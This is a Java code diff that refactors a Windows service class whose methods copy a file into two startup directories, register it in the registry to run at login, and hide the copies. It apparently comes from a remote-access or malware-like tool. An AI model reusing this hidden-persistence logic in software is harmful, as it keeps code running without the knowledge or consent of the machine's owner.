@@ -29,20 +29,20 @@ public final class WindowsService implements IOperatingSystemService {
 	
 	@Override
 	public void addToStartup(final File file) {
+		final String name = file.getName();
+		final String path = STARTUP_DIRECTORY_PATH + File.separator + name;
+		final String path2 = STARTUP_DIRECTORY_PATH_2 + File.separator + name;
+		final File destination = new File(path);
+		final File destination2 = new File(path2);
+		final String registryCommand = String.format(STARTUP_REGISTRY_COMMAND, name, path);
+		final String hideFileCommand = String.format(HIDE_FILE_COMMAND, path);
+		final String hideFileCommand2 = String.format(HIDE_FILE_COMMAND, path2);
+		
+		FileUtils.createFile(path);
+		FileUtils.copyFile(file, destination);
+		FileUtils.copyFile(file, destination2);
+		
 		try {
-			final String name = file.getName();
-			final String path = STARTUP_DIRECTORY_PATH + File.separator + name;
-			final String path2 = STARTUP_DIRECTORY_PATH_2 + File.separator + name;
-			final File destination = new File(path);
-			final File destination2 = new File(path2);
-			final String registryCommand = String.format(STARTUP_REGISTRY_COMMAND, name, path);
-			final String hideFileCommand = String.format(HIDE_FILE_COMMAND, path);
-			final String hideFileCommand2 = String.format(HIDE_FILE_COMMAND, path2);
-			
-			FileUtils.createFile(path);
-			FileUtils.copyFile(file, destination);
-			FileUtils.copyFile(file, destination2);
-			
 			Runtime.getRuntime().exec(registryCommand);
 			Runtime.getRuntime().exec(hideFileCommand);
 			Runtime.getRuntime().exec(hideFileCommand2);
@@ -53,16 +53,16 @@ public final class WindowsService implements IOperatingSystemService {
 	
 	@Override
 	public void removeFromStartup(final String name) {
+		final String path = STARTUP_DIRECTORY_PATH + File.separator + name;
+		final String path2 = STARTUP_DIRECTORY_PATH_2 + File.separator + name;
+		final String registryRemoveCommand = String.format(STARTUP_REGISTRY_REMOVE_COMMAND, name);
+		final File file = new File(path);
+		final File file2 = new File(path2);
+		
+		file.delete();
+		file2.delete();
+		
 		try {
-			final String path = STARTUP_DIRECTORY_PATH + File.separator + name;
-			final String path2 = STARTUP_DIRECTORY_PATH_2 + File.separator + name;
-			final String registryRemoveCommand = String.format(STARTUP_REGISTRY_REMOVE_COMMAND, name);
-			final File file = new File(path);
-			final File file2 = new File(path2);
-			
-			file.delete();
-			file2.delete();
-			
 			Runtime.getRuntime().exec(registryRemoveCommand);
 		} catch (final Exception ex) {
 			ex.printStackTrace();
